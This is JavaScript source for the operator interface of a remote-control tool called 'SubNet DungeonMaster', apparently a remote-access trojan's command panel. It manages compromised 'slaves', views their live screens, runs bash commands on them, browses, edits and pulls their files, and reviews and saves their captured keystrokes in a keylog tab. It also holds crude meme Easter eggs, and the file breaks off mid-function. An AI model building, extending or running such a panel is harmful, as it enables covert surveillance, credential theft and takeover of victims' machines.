/**
 * SubNet DungeonMaster — frontend
 *
 * Hotkeys: 1–5 tabs, S drawer, R reconnect, Esc, Ctrl+L bash
 * Bash: ↑↓ history
 * playSound(base64 [, mime]) / stopSound()
 */

(function () {
  'use strict';

  const $  = (sel, root = document) => root.querySelector(sel);
  const $$ = (sel, root = document) => [...root.querySelectorAll(sel)];

  function on(el, ev, fn, opts) {
    if (el) el.addEventListener(ev, fn, opts);
  }

  function callPython(method, ...args) {
    try {
      if (window.pywebview && window.pywebview.api && typeof window.pywebview.api[method] === 'function') {
        return window.pywebview.api[method](...args);
      }
    } catch (e) {
      console.warn('[pywebview]', method, e);
    }
    console.log(`[stub] ${method}`, ...args);
    return Promise.resolve(null);
  }

  function escapeHtml(str) {
    const d = document.createElement('div');
    d.textContent = str == null ? '' : String(str);
    return d.innerHTML;
  }

  function joinPath(base, name) {
    if (!base || base === '/') return '/' + String(name).replace(/^\/+/, '');
    return base.replace(/\/+$/, '') + '/' + String(name).replace(/^\/+/, '');
  }

  function parentPath(path) {
    if (!path || path === '/') return '/';
    const parts = path.replace(/\/+$/, '').split('/');
    parts.pop();
    return parts.join('/') || '/';
  }

  const PAGE_ORDER = ['info', 'screen', 'bash', 'explorer', 'keylog'];
  const BASH_HISTORY_KEY = 'dm_bash_history';
  const BASH_HISTORY_MAX = 80;

  let currentPage = 'info';
  let activeSlaveId = null;
  let slavesTreeData = [];
  let slavesIndex = {};
  let explorerPath = '/';
  let explorerEntries = [];
  let explorerOpenPath = null;
  let cmEditor = null;
  let keylogTree = {};          // { date: { hour: { min: { sec: [keys] } } } }
  let keylogSelected = new Set(); // keys: "date|h|m|s|idx"
  let keylogFlatCache = [];       // flattened for save

  let bashHistory = [];
  try {
    bashHistory = JSON.parse(localStorage.getItem(BASH_HISTORY_KEY) || '[]');
    if (!Array.isArray(bashHistory)) bashHistory = [];
  } catch (_) { bashHistory = []; }
  let bashHistoryIdx = -1;
  let bashDraft = '';

  const splash = $('#splash');
  const app = $('#app');
  const passwordInp = $('#password');
  const btnLogin = $('#btn-login');
  const loginError = $('#login-error');
  const btnSlaves = $('#btn-slaves');
  const drawer = $('#drawer');
  const drawerOverlay = $('#drawer-overlay');
  const btnDrawerClose = $('#btn-drawer-close');
  const slavesTreeEl = $('#slaves-tree');
  const tabs = $('#tabs');
  const infoGrid = $('#info-grid');
  const infoMeta = $('#info-meta');
  const infoNoSlave = $('#info-no-slave');
  const screenImg = $('#screen-img');
  const screenPlaceholder = $('#screen-placeholder');
  const dropzone = $('#screen-dropzone');
  const bashOutput = $('#bash-output');
  const bashInput = $('#bash-input');
  const activeSlaveBar = $('#active-slave-bar');
  const activeSlaveName = $('#active-slave-name');
  const activeSlaveDot = $('#active-slave-dot');
  const btnCloseSlave = $('#btn-close-slave');
  const announceContainer = $('#announce-container');
  const iconMaximize = $('#icon-maximize');
  const iconRestore = $('#icon-restore');
  const stateList = $('#state-list');
  const stateMeta = $('#state-meta');
  const stateEmpty = $('#state-empty');
  const explorerTree = $('#explorer-tree');
  const explorerPathEl = $('#explorer-path');
  const explorerFileName = $('#explorer-file-name');
  const explorerImageWrap = $('#explorer-image-wrap');
  const explorerImage = $('#explorer-image');
  const explorerEditorWrap = $('#explorer-editor-wrap');
  const explorerEditor = $('#explorer-editor');
  const explorerViewerEmpty = $('#explorer-viewer-empty');
  const btnExplorerSave = $('#btn-explorer-save');
  const btnExplorerClose = $('#btn-explorer-close-viewer');
  const btnExplorerDownload = $('#btn-explorer-download');
  const keylogList = $('#keylog-list');
  const keylogEmpty = $('#keylog-empty');
  const keylogMeta = $('#keylog-meta');
  const keylogFilterDate = $('#keylog-filter-date');
  const keylogFilterHour = $('#keylog-filter-hour');
  const keylogFilterMin = $('#keylog-filter-min');
  const keylogFilterSec = $('#keylog-filter-sec');
  const keylogFilterKey = $('#keylog-filter-key');
  const btnKeylogApply = $('#btn-keylog-apply');
  const btnKeylogSave = $('#btn-keylog-save');
  const btnKeylogExpand = $('#btn-keylog-expand');
  const btnKeylogCollapse = $('#btn-keylog-collapse');

  function isTypingTarget(el) {
    if (!el) return false;
    const tag = (el.tagName || '').toUpperCase();
    if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') return true;
    if (el.isContentEditable) return true;
    if (el.closest && el.closest('.CodeMirror')) return true;
    return false;
  }

  function pushBashHistory(cmd) {
    if (!cmd) return;
    if (bashHistory[0] === cmd) return;
    bashHistory.unshift(cmd);
    if (bashHistory.length > BASH_HISTORY_MAX) bashHistory.length = BASH_HISTORY_MAX;
    try { localStorage.setItem(BASH_HISTORY_KEY, JSON.stringify(bashHistory)); } catch (_) {}
  }

  function sendAnnounce(message, type) {
    type = type || 'info';
    if (!announceContainer) return;
    const el = document.createElement('div');
    el.className = 'announce ' + type;
    el.innerHTML = '<span class="announce-msg">' + escapeHtml(message) + '</span><button class="announce-close" type="button">×</button>';
    const dismiss = () => { el.classList.add('hiding'); setTimeout(() => el.remove(), 300); };
    on(el.querySelector('.announce-close'), 'click', dismiss);
    announceContainer.appendChild(el);
    setTimeout(dismiss, type === 'error' ? 8000 : 5000);
  }

  function setLoginError(msg) {
    if (!loginError) return;
    if (!msg) { loginError.hidden = true; loginError.textContent = ''; return; }
    loginError.textContent = msg; loginError.hidden = false;
  }

  function setMaximized(state) {
    if (iconMaximize) iconMaximize.hidden = !!state;
    if (iconRestore) iconRestore.hidden = !state;
  }

  function updateNoSlaveHint() {
    const noSlave = !activeSlaveId;
    if (infoNoSlave) infoNoSlave.classList.toggle('visible', noSlave);
    if (infoGrid) infoGrid.style.display = noSlave ? 'none' : '';
    if (bashInput) {
      bashInput.disabled = noSlave;
      bashInput.placeholder = noSlave ? 'select a slave first, master…' : 'command…';
    }
  }

  function updateActiveSlaveBar(slave) {
    if (!activeSlaveBar) return;
    if (!slave) { activeSlaveBar.hidden = true; return; }
    activeSlaveBar.hidden = false;
    if (activeSlaveName) activeSlaveName.textContent = slave.displayName || slave.id;
    if (activeSlaveDot) activeSlaveDot.classList.toggle('online', !!slave.online);
  }

  function switchPage(name) {
    if (!name || name === currentPage) return;
    if (PAGE_ORDER.indexOf(name) < 0) return;
    currentPage = name;
    $$('.tab').forEach(t => t.classList.toggle('active', t.dataset.page === name));
    $$('.page').forEach(p => p.classList.toggle('active', p.id === 'page-' + name));
    callPython('on_page_change', name);
    if (name === 'bash' && bashInput) setTimeout(() => bashInput.focus(), 50);
    if (name === 'explorer') setTimeout(refreshExplorerEditor, 50);
  }

  function openDrawer() {
    if (drawer) drawer.classList.add('open');
    if (drawerOverlay) drawerOverlay.classList.add('open');
  }
  function closeDrawer() {
    if (drawer) drawer.classList.remove('open');
    if (drawerOverlay) drawerOverlay.classList.remove('open');
  }
  function toggleDrawer() {
    if (drawer && drawer.classList.contains('open')) closeDrawer();
    else openDrawer();
  }

  function doReconnect() {
    const btn = $('#btn-reconnect');
    if (btn) {
      btn.classList.add('spinning');
      setTimeout(() => btn.classList.remove('spinning'), 900);
    }
    callPython('on_reconnect');
  }


  function setAuthenticated(state) {
    if (state) {
      if (splash) splash.hidden = true;
      if (app) app.hidden = false;
      updateNoSlaveHint();
    } else {
      if (app) app.hidden = true;
      if (splash) splash.hidden = false;
      if (passwordInp) passwordInp.value = '';
      setLoginError(null);
      closeSlave(false);
    }
  }

  function onLogin() {
    if (!passwordInp) return;
    const v = (passwordInp.value || '').trim().toLowerCase().replace(/\s+/g, '');
    const secrets = {
      '300': 'Fisting is 300 bucks — noted, master',
      'billy': 'Billy Herrington has entered the dungeon',
      'van': 'Van Darkholme is watching',
      'asswecan': 'Protocol ASS-WE-CAN engaged',
      'lotion': 'It is so deep… in the logs',
    };
    if (secrets[v]) sendAnnounce(secrets[v], 'success');
    callPython('log_in', passwordInp.value);
  }

  function bindDrag(el) {
    if (!el) return;
    let startX, startY;
    on(el, 'mousedown', (e) => {
      if (e.button !== 0) return;
      if (e.target.closest('button, input, select, a, .no-drag')) return;
      startX = e.screenX; startY = e.screenY;
      const onMove = (ev) => {
        const dx = ev.screenX - startX, dy = ev.screenY - startY;
        startX = ev.screenX; startY = ev.screenY;
        callPython('window_move', dx, dy);
      };
      const onUp = () => {
        document.removeEventListener('mousemove', onMove);
        document.removeEventListener('mouseup', onUp);
      };
      document.addEventListener('mousemove', onMove);
      document.addEventListener('mouseup', onUp);
    });
  }

  // window controls
  on($('#btn-minimize'), 'click', () => callPython('window_minimize'));
  on($('#btn-maximize'), 'click', () => callPython('window_maximize'));
  on($('#btn-close'), 'click', () => callPython('window_close'));
  on($('#btn-splash-minimize'), 'click', () => callPython('window_minimize'));
  on($('#btn-splash-close'), 'click', () => callPython('window_close'));
  on(btnLogin, 'click', onLogin);
  on(passwordInp, 'keydown', (e) => { if (e.key === 'Enter') onLogin(); });
  bindDrag($('#titlebar-drag'));
  bindDrag($('#splash-drag'));

  on(tabs, 'click', (e) => {
    const btn = e.target.closest('.tab');
    if (!btn) return;
    switchPage(btn.dataset.page);
  });

  on(btnSlaves, 'click', toggleDrawer);
  on(btnDrawerClose, 'click', closeDrawer);
  on(drawerOverlay, 'click', closeDrawer);

  const btnSlavesRefresh = $('#btn-slaves-refresh');
  on(btnSlavesRefresh, 'click', () => {
    if (btnSlavesRefresh) {
      btnSlavesRefresh.classList.add('spinning');
      setTimeout(() => btnSlavesRefresh.classList.remove('spinning'), 800);
    }
    callPython('on_slaves_refresh');
  });
  on($('#btn-reconnect'), 'click', doReconnect);

  // ─── slaves tree ───────────────────────────────────────────
  function rebuildIndex(nodes, map) {
    map = map || {};
    slavesIndex = map;
    (nodes || []).forEach(n => {
      if (n.type === 'slave') map[n.id] = n;
      if (n.children) rebuildIndex(n.children, map);
    });
    return map;
  }

  function setSlavesTree(tree) {
    slavesTreeData = Array.isArray(tree) ? tree : [];
    rebuildIndex(slavesTreeData);
    renderSlavesTree();
    if (activeSlaveId && !slavesIndex[activeSlaveId]) closeSlave(false);
    else if (activeSlaveId) updateActiveSlaveBar(slavesIndex[activeSlaveId]);
  }

  function renderSlavesTree() {
    if (!slavesTreeEl) return;
    slavesTreeEl.innerHTML = '';
    if (!slavesTreeData.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty';
      empty.textContent = 'Dungeon is empty';
      slavesTreeEl.appendChild(empty);
    } else {
      slavesTreeData.forEach(node => {
        slavesTreeEl.appendChild(node.type === 'group' ? renderGroup(node) : renderSlave(node));
      });
    }
    slavesTreeEl.classList.add('drop-root');
    slavesTreeEl.ondragover = (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault();
      slavesTreeEl.classList.add('drop-target');
    };
    slavesTreeEl.ondragleave = () => slavesTreeEl.classList.remove('drop-target');
    slavesTreeEl.ondrop = (e) => {
      slavesTreeEl.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      callPython('on_slave_group_changed', id, null);
    };
  }

  function renderGroup(group) {
    const el = document.createElement('div');
    el.className = 'tree-group' + (group.collapsed ? ' collapsed' : '');
    el.dataset.group = group.name;

    const header = document.createElement('div');
    header.className = 'tree-group-header';
    header.innerHTML =
      '<span class="chevron">▼</span>' +
      '<span class="group-name">' + escapeHtml(group.name) + '</span>' +
      '<span class="group-count">' + ((group.children || []).length) + '</span>' +
      '<span class="group-actions">' +
        '<button type="button" data-act="rename" title="Rename group">✎</button>' +
        '<button type="button" data-act="delete" class="danger" title="Delete group">×</button>' +
      '</span>';

    on(header, 'click', (e) => {
      if (e.target.closest('.group-name-input') || e.target.closest('.group-actions')) return;
      el.classList.toggle('collapsed');
      callPython('on_group_toggle', group.name, el.classList.contains('collapsed'));
    });

    const nameSpan = header.querySelector('.group-name');
    on(nameSpan, 'dblclick', (e) => { e.stopPropagation(); startGroupRename(group, nameSpan); });
    on(header.querySelector('[data-act="rename"]'), 'click', (e) => {
      e.stopPropagation(); startGroupRename(group, nameSpan);
    });
    on(header.querySelector('[data-act="delete"]'), 'click', (e) => {
      e.stopPropagation();
      if (!confirm('Delete group "' + group.name + '"? Slaves will be ungrouped.')) return;
      callPython('on_group_delete', group.name);
    });

    const drop = (e) => {
      header.classList.remove('drop-target');
      const id = e.dataTransfer.getData('application/x-slave-id');
      if (!id) return;
      e.preventDefault();
      e.stopPropagation();
      callPython('on_slave_group_changed', id, group.name);
    };
    on(header, 'dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault(); e.stopPropagation();
      header.classList.add('drop-target');
    });
    on(header, 'dragleave', () => header.classList.remove('drop-target'));
    on(header, 'drop', drop);

    const body = document.createElement('div');
    body.className = 'tree-group-body';
    on(body, 'dragover', (e) => {
      if (!e.dataTransfer.types.includes('application/x-slave-id')) return;
      e.preventDefault(); e.stopPropagation();
      header.classList.add('drop-target');
    });
    on(body, 'drop', drop);

    (group.children || []).forEach(child => {
      body.appendChild(child.type === 'group' ? renderGroup(child) : renderSlave(child));
    });
    el.appendChild(header);
    el.appendChild(body);
    return el;
  }

  function startGroupRename(group, nameSpan) {
    if (!nameSpan || !nameSpan.parentNode) return;
    const input = document.createElement('input');
    input.className = 'group-name-input';
    input.value = group.name;
    nameSpan.replaceWith(input);
    input.focus();
    input.select();
    let done = false;
    const commit = () => {
      if (done) return;
      done = true;
      const next = input.value.trim();
      if (next && next !== group.name) {
        callPython('on_group_rename', group.name, next);
        group.name = next;
      }
      renderSlavesTree();
    };
    on(input, 'keydown', (e) => {
      if (e.key === 'Enter') { e.preventDefault(); commit(); }
      if (e.key === 'Escape') { done = true; renderSlavesTree(); }
    });
    on(input, 'blur', commit);
  }

  function renderSlave(slave) {
    const el = document.createElement('div');
    el.className = 'slave-item' + (slave.id === activeSlaveId ? ' selected' : '');
    el.dataset.id = slave.id;
    el.draggable = true;
    const pingStr = slave.ping != null ? slave.ping + ' ms' : '—';
    el.innerHTML =
      '<span class="slave-status ' + (slave.online ? 'online' : '') + '"></span>' +
      '<div class="slave-body">' +
        '<div class="slave-name-row">' +
          '<span class="slave-name">' + escapeHtml(slave.displayName || slave.id) + '</span>' +
          '<button type="button" class="btn-rename-slave" title="Rename">✎</button>' +
        '</div>' +
        '<div class="slave-meta">' +
          '<span class="id">' + escapeHtml(slave.id) + '</span>' +
          '<span>' + escapeHtml(slave.ip || '—') + '</span>' +
          '<span>' + pingStr + '</span>' +
        '</div>' +
      '</div>';

    on(el, 'click', (e) => {
      if (e.target.closest('.btn-rename-slave') || e.target.closest('.slave-name-input')) return;
      openSlave(slave.id);
    });
    on(el, 'contextmenu', (e) => {
      e.preventDefault();
      callPython('on_slave_context', slave.id, e.clientX, e.clientY);
    });

    const nameEl = el.querySelector('.slave-name');
    const startRename = (e) => {
      if (e) e.stopPropagation();
      const row = el.querySelector('.slave-name-row');
      const input = document.createElement('input');
      input.className = 'slave-name-input';
      input.value = slave.displayName || slave.id;
      nameEl.replaceWith(input);
      const btn = row && row.querySelector('.btn-rename-slave');
      if (btn) btn.hidden = true;
      input.focus();
      input.select();
      let done = false;
      const commit = () => {
        if (done) return;
        done = true;
        const next = input.value.trim();
        if (next && next !== (slave.displayName || slave.id)) {
          slave.displayName = next;
          callPython('on_slave_display_name_changed', slave.id, next);
          if (activeSlaveId === slave.id) updateActiveSlaveBar(slave);
        }
        renderSlavesTree();
      };
      on(input, 'keydown', (ev) => {
        if (ev.key === 'Enter') { ev.preventDefault(); commit(); }
        if (ev.key === 'Escape') { done = true; renderSlavesTree(); }
      });
      on(input, 'blur', commit);
    };
    on(nameEl, 'dblclick', startRename);
    on(el.querySelector('.btn-rename-slave'), 'click', startRename);
    on(el, 'dragstart', (e) => {
      e.dataTransfer.setData('application/x-slave-id', slave.id);
      e.dataTransfer.effectAllowed = 'move';
      el.classList.add('dragging');
    });
    on(el, 'dragend', () => el.classList.remove('dragging'));
    return el;
  }

  on($('#btn-slaves-add-group'), 'click', () => {
    const name = prompt('Group name');
    if (!name || !name.trim()) return;
    callPython('on_group_create', name.trim());
  });

  function openSlave(id) {
    const slave = slavesIndex[id];
    if (!slave) return;
    const prev = activeSlaveId;
    activeSlaveId = id;
    $$('.slave-item').forEach(s => s.classList.toggle('selected', s.dataset.id === id));
    updateActiveSlaveBar(slave);
    updateNoSlaveHint();
    if (prev !== id) {
      setInfo({}); setScreen(null); clearBash();
      appendBash('Slave ' + (slave.displayName || id) + ' joined the dungeon', 'sys');
    }
    callPython('on_slave_open', id);
  }

  function closeSlave(notify) {
    if (notify === undefined) notify = true;
    const prev = activeSlaveId;
    activeSlaveId = null;
    $$('.slave-item').forEach(s => s.classList.remove('selected'));
    if (activeSlaveBar) activeSlaveBar.hidden = true;
    updateNoSlaveHint();
    setInfo({}); setScreen(null); clearBash();
    if (notify && prev) callPython('on_slave_close', prev);
  }

  on(btnCloseSlave, 'click', () => closeSlave(true));

  function setInfo(data) {
    if (!infoGrid) return;
    infoGrid.innerHTML = '';
    let entries = [];
    if (Array.isArray(data)) entries = data.map(item => [item.key, item.value]);
    else if (data && typeof data === 'object') entries = Object.entries(data);
    if (!entries.length) {
      if (activeSlaveId) {
        const empty = document.createElement('div');
        empty.className = 'info-empty';
        empty.style.gridColumn = '1 / -1';
        empty.textContent = 'No data';
        infoGrid.appendChild(empty);
      }
      if (infoMeta) infoMeta.textContent = '—';
      return;
    }
    entries.forEach(([key, value]) => {
      const card = document.createElement('div');
      card.className = 'info-card';
      card.innerHTML = '<span class="key">' + escapeHtml(key) + '</span><span class="value">' + escapeHtml(value) + '</span>';
      infoGrid.appendChild(card);
    });
    if (infoMeta) infoMeta.textContent = entries.length + ' item' + (entries.length === 1 ? '' : 's');
  }

  function setScreen(base64, mime) {
    if (!screenImg) return;
    if (!base64) {
      screenImg.hidden = true; screenImg.removeAttribute('src');
      if (screenPlaceholder) screenPlaceholder.hidden = false;
      return;
    }
    let src = base64;
    if (typeof base64 === 'string' && !base64.startsWith('data:')) {
      src = 'data:' + (mime || 'image/jpeg') + ';base64,' + base64.replace(/\s+/g, '');
    }
    screenImg.src = src; screenImg.hidden = false;
    if (screenPlaceholder) screenPlaceholder.hidden = true;
  }

  if (dropzone) {
    ['dragenter', 'dragover'].forEach(ev => {
      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.add('drag-over'); });
    });
    ['dragleave', 'drop'].forEach(ev => {
      on(dropzone, ev, (e) => { e.preventDefault(); e.stopPropagation(); dropzone.classList.remove('drag-over'); });
    });
    on(dropzone, 'drop', (e) => {
      const files = e.dataTransfer.files;
      if (!files || !files.length) return;
      const file = files[0];
      if (!file.type.startsWith('image/')) { callPython('on_screen_drop', null, 'not_image'); return; }
      const reader = new FileReader();
      reader.onload = () => { setScreen(reader.result); callPython('on_screen_drop', reader.result, file.name); };
      reader.readAsDataURL(file);
    });
  }
  on($('#btn-screen-expand'), 'click', () => callPython('on_screen_expand'));
  on($('#screen-fps'), 'change', (e) => callPython('on_screen_fps', Number(e.target.value)));
  on($('#screen-quality'), 'change', (e) => callPython('on_screen_quality', e.target.value));

  function appendBash(text, type) {
    if (!bashOutput) return;
    type = type || 'out';
    const line = document.createElement('div');
    line.className = 'bash-line ' + type;
    line.textContent = text;
    bashOutput.appendChild(line);
    bashOutput.scrollTop = bashOutput.scrollHeight;
  }
  function clearBash() { if (bashOutput) bashOutput.innerHTML = ''; }

  function submitBash() {
    if (!activeSlaveId) { sendAnnounce('No slave selected, master', 'warn'); return; }
    if (!bashInput) return;
    const cmd = bashInput.value.trim();
    if (!cmd) return;
    appendBash(cmd, 'cmd');
    pushBashHistory(cmd);
    bashHistoryIdx = -1;
    bashDraft = '';
    bashInput.value = '';
    callPython('on_bash_command', cmd);
  }

  on(bashInput, 'keydown', (e) => {
    if (e.key === 'Enter') { e.preventDefault(); submitBash(); return; }
    if (e.key === 'ArrowUp') {
      e.preventDefault();
      if (!bashHistory.length) return;
      if (bashHistoryIdx < 0) bashDraft = bashInput.value;
      if (bashHistoryIdx < bashHistory.length - 1) bashHistoryIdx++;
      bashInput.value = bashHistory[bashHistoryIdx] || '';
      return;
    }
    if (e.key === 'ArrowDown') {
      e.preventDefault();
      if (bashHistoryIdx < 0) return;
      bashHistoryIdx--;
      bashInput.value = bashHistoryIdx < 0 ? bashDraft : (bashHistory[bashHistoryIdx] || '');
    }
  });

  // bash secrets (capture) — work without selected slave
  const GACHI_QUOTES = [
    'Ass we can', 'Thank you sir', '300 bucks', 'Boss of this gym',
    'Deep dark fantasies', 'It is so deep', 'I am an artist', 'Fisting is 300 bucks',
  ];
  const BASH_SECRETS = {
    'boss of this gym': 'You are now boss of this gym',
    'ass we can': 'YES WE CAN',
    'thank you sir': 'You are welcome, master',
    '300 bucks': 'Invoice sent to the dungeon',
    'gachi': null,
    'lotion': 'Application requires elevated privileges',
  };
  on(bashInput, 'keydown', (e) => {
    if (e.key !== 'Enter') return;
    const raw = (bashInput.value || '').trim();
    const cmd = raw.toLowerCase();
    if (!(cmd in BASH_SECRETS)) return;
    e.stopImmediatePropagation();
    e.preventDefault();
    const code = BASH_SECRETS[cmd];
    appendBash(raw, 'cmd');
    pushBashHistory(raw);
    bashHistoryIdx = -1;
    bashInput.value = '';
    const msg = code === null
      ? GACHI_QUOTES[Math.floor(Math.random() * GACHI_QUOTES.length)]
      : code;
    appendBash(msg, 'sys');
    sendAnnounce(msg, 'success');
  }, true);

  // STATE (panel inside INFO)
  function setSlaveState(items) {
    if (!stateList) return;
    stateList.innerHTML = '';
    const list = Array.isArray(items) ? items : [];
    if (stateEmpty) stateEmpty.classList.toggle('visible', !list.length);
    if (stateMeta) stateMeta.textContent = list.length ? String(list.length) : '—';
    list.forEach((item) => {
      const el = document.createElement('div');
      el.className = 'state-item';
      const statusClass = String(item.status || '').toLowerCase().replace(/\s+/g, '-');
      const actions = (item.actions || []).map((a) => {
        const id = typeof a === 'string' ? a : a.id;
        const label = typeof a === 'string' ? a : (a.label || a.id);
        return '<button class="tool-btn" data-action="' + escapeHtml(id) + '">' + escapeHtml(label) + '</button>';
      }).join('');
      el.innerHTML =
        '<div class="state-item-body">' +
          '<div class="state-item-name">' + escapeHtml(item.name || item.id || '—') + '</div>' +
          '<div class="state-item-desc">' + escapeHtml(item.description || '') + '</div>' +
        '</div>' +
        '<span class="state-item-status ' + escapeHtml(statusClass) + '">' + escapeHtml(item.status || '—') + '</span>' +
        '<div class="state-item-actions">' + actions + '</div>';
      el.querySelectorAll('[data-action]').forEach((btn) => {
        on(btn, 'click', () => callPython('on_state_action', item.id || item.name, btn.dataset.action));
      });
      stateList.appendChild(el);
    });
  }

  // EXPLORER
  function initCodeMirror() {
    if (cmEditor) return cmEditor;
    if (typeof CodeMirror === 'undefined') {
      console.warn('[CM] CodeMirror not loaded — using textarea');
      return null;
    }
    if (!explorerEditor) return null;
    try {
      cmEditor = CodeMirror.fromTextArea(explorerEditor, {
        theme: 'material-darker',
        lineNumbers: true,
        lineWrapping: true,
        indentUnit: 4,
        mode: 'text/plain',
        viewportMargin: 30,
      });
      return cmEditor;
    } catch (e) {
      console.warn('[CM] init failed', e);
      cmEditor = null;
      return null;
    }
  }

  function refreshExplorerEditor() {
    if (!cmEditor) return;
    try {
      const wrap = explorerEditorWrap;
      if (!wrap || wrap.hidden) return;
      // prefer explicit pixel size from viewer area
      const viewer = wrap.parentElement;
      let h = wrap.clientHeight;
      let w = wrap.clientWidth;
      if (h < 40 && viewer) {
        const header = viewer.querySelector('.explorer-viewer-header');
        const hh = header ? header.offsetHeight : 0;
        h = Math.max(200, (viewer.clientHeight || 0) - hh);
        w = viewer.clientWidth || w;
      }
      if (w < 40) w = Math.max(200, (viewer && viewer.clientWidth) || 400);
      if (h < 40) h = 320;
      cmEditor.setSize(w, h);
      cmEditor.refresh();
    } catch (e) {
      console.warn('[CM] refresh', e);
    }
  }


  function guessMode(path) {
    const ext = (path || '').split('.').pop().toLowerCase();
    const map = {
      js: 'javascript', ts: 'javascript', py: 'python',
      html: 'htmlmixed', htm: 'htmlmixed', css: 'css',
      json: 'application/json', xml: 'xml', md: 'text/plain', txt: 'text/plain',
    };
    return map[ext] || 'text/plain';
  }

  function isImageName(name) {
    return /\.(png|jpe?g|gif|webp|bmp|svg)$/i.test(name || '');
  }

  function setExplorerPath(path) {
    explorerPath = path == null || path === '' ? '/' : String(path);
    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
  }

  function setLocal(entries, path) {
    if (path != null) setExplorerPath(path);
    explorerEntries = Array.isArray(entries) ? entries.slice() : [];
    explorerEntries.sort((a, b) => {
      if (!!a.folder !== !!b.folder) return a.folder ? -1 : 1;
      return String(a.name).localeCompare(String(b.name));
    });
    if (explorerPathEl) explorerPathEl.textContent = explorerPath;
    renderExplorerTree();
  }

  function renderExplorerTree() {
    if (!explorerTree) return;
    explorerTree.innerHTML = '';
    if (!explorerEntries.length) {
      const empty = document.createElement('div');
      empty.className = 'tree-empty';
      empty.textContent = 'Empty';
      explorerTree.appendChild(empty);
      return;
    }
    explorerEntries.forEach((entry) => {
      const full = joinPath(explorerPath, entry.name);
      const el = document.createElement('div');
      el.className = 'explorer-item' + (entry.folder ? ' folder' : '') + (explorerOpenPath === full ? ' selected' : '');
      el.draggable = true;
      el.innerHTML =
        '<span class="icon">' + (entry.folder ? '▣' : '▤') + '</span>' +
        '<span class="explorer-item-name">' + escapeHtml(entry.name) + '</span>' +
        '<span class="explorer-item-actions">' +
          (entry.folder ? '' : '<button type="button" data-act="download" title="Download">↓</button>') +
          '<button type="button" data-act="rename" title="Rename">✎</button>' +
          '<button type="button" data-act="remove" title="Remove">×</button>' +
        '</span>';

      on(el, 'click', (e) => {
        if (e.target.closest('[data-act]')) return;
        if (entry.folder) callPython('on_open_folder', full);
        else callPython('on_open_file', full);
      });
      on(el.querySelector('[data-act="download"]'), 'click', (e) => {
        e.stopPropagation();
        callPython('on_file_download', full);
      });
      on(el.querySelector('[data-act="remove"]'), 'click', (e) => {
        e.stopPropagation();
        callPython('on_item_remove', full, !!entry.folder);
      });
      on(el.querySelector('[data-act="rename"]'), 'click', (e) => {
        e.stopPropagation();
        const next = prompt('Rename to', entry.name);
        if (!next || next === entry.name) return;
        callPython('on_rename', full, joinPath(explorerPath, next));
      });
      on(el, 'dragstart', (e) => {
        e.dataTransfer.setData('application/x-explorer-path', full);
        e.dataTransfer.setData('application/x-explorer-folder', entry.folder ? '1' : '0');
        e.dataTransfer.effectAllowed = 'move';
        el.classList.add('dragging');
      });
      on(el, 'dragend', () => el.classList.remove('dragging'));
      if (entry.folder) {
        on(el, 'dragover', (e) => {
          if (!e.dataTransfer.types.includes('application/x-explorer-path')) return;
          e.preventDefault();
          e.stopPropagation();
          el.classList.add('drop-target');
        });
        on(el, 'dragleave', () => el.classList.remove('drop-target'));
        on(el, 'drop', (e) => {
          el.classList.remove('drop-target');
          const src = e.dataTransfer.getData('application/x-explorer-path');
          if (!src || src === full) return;
          e.preventDefault();
          e.stopPropagation();
          const baseName = src.split('/').filter(Boolean).pop();
          callPython('on_move', src, joinPath(full, baseName));
        });
      }
      explorerTree.appendChild(el);
    });
  }

  function showViewerPane(which) {
    /* which: 'image' | 'editor' | 'empty' */
    const set = (el, on, displayOn) => {
      if (!el) return;
      el.hidden = !on;
      if (on) {
        el.removeAttribute('hidden');
        el.style.display = displayOn;
        el.style.visibility = 'visible';
        el.style.opacity = '1';
      } else {
        el.style.display = 'none';
      }
    };
    set(explorerImageWrap, which === 'image', 'flex');
    set(explorerEditorWrap, which === 'editor', 'flex');
    set(explorerViewerEmpty, which === 'empty', 'flex');
  }

  /**
   * setExplorerFile(path, content, isImage)
   * content: text for files; base64 or data-URI for images
   */
  function setExplorerFile(path, content, isImage) {
    explorerOpenPath = path || null;
    if (explorerFileName) explorerFileName.textContent = path || '—';
    if (btnExplorerClose) btnExplorerClose.hidden = !path;
    if (btnExplorerDownload) btnExplorerDownload.hidden = !path;

    if (!path) {
      closeExplorerViewer();
      return;
    }

    const image = isImage === true || (isImage == null && isImageName(path));

    if (image) {
      if (btnExplorerSave) btnExplorerSave.hidden = true;
      showViewerPane('image');
      let src = content == null ? '' : String(content);
      if (src && !/^data:|^blob:|^https?:/i.test(src)) {
        let mime = 'image/png';
        const ext = (path.split('.').pop() || '').toLowerCase();
        if (ext === 'jpg' || ext === 'jpeg') mime = 'image/jpeg';
        else if (ext === 'gif') mime = 'image/gif';
        else if (ext === 'webp') mime = 'image/webp';
        else if (ext === 'bmp') mime = 'image/bmp';
        else if (ext === 'svg') mime = 'image/svg+xml';
        src = 'data:' + mime + ';base64,' + src.replace(/\s+/g, '');
      }
      if (explorerImage) {
        explorerImage.onerror = () => sendAnnounce('Image preview failed', 'warn');
        explorerImage.src = src || '';
        explorerImage.hidden = false;
      }
      renderExplorerTree();
      return;
    }

    // ── text file ──
    if (btnExplorerSave) btnExplorerSave.hidden = false;
    showViewerPane('editor');
    const text = content == null ? '' : String(content);

    // Always keep textarea in sync (fallback if CM missing/broken)
    if (explorerEditor) {
      explorerEditor.value = text;
      explorerEditor.style.display = '';
    }

    const cm = initCodeMirror();
    if (cm) {
      cm.setValue(text);
      cm.setOption('mode', guessMode(path));
      // textarea is hidden by fromTextArea — ensure CM wrapper visible
      const wrapper = cm.getWrapperElement && cm.getWrapperElement();
      if (wrapper) {
        wrapper.style.display = 'block';
        wrapper.style.minHeight = '240px';
        wrapper.style.height = '100%';
        wrapper.style.opacity = '1';
        wrapper.style.visibility = 'visible';
      }
      const doRefresh = () => refreshExplorerEditor();
      requestAnimationFrame(doRefresh);
      setTimeout(doRefresh, 0);
      setTimeout(doRefresh, 50);
      setTimeout(doRefresh, 150);
      setTimeout(doRefresh, 400);
    } else if (explorerEditor) {
      // pure textarea mode
